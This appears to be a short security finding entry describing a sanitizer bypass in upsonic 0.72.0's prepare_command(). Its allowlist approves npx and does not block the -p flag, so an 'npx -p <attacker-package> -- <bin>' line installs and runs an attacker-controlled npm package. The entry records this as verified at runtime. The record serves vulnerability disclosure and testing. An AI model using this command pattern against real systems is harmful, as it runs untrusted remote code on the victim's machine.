_pattern: Sanitizer bypass — npx is in approved-commands allowlist; -p (package) is not in blocked-special-characters list; but `npx -p <attacker-package> -- <bin>` makes npm install and run an attacker-controlled package.
_attack_path: npx -p attacker-package -- bin → npm fetches package from npm registry (attacker squat / typo / actual malicious) → bin executes locally.
_runtime_verified: ACCEPTED by upsonic-0.72.0 prepare_command(). No shell metacharacters; npx is on PATH so shutil.which short-circuits the allowlist check.
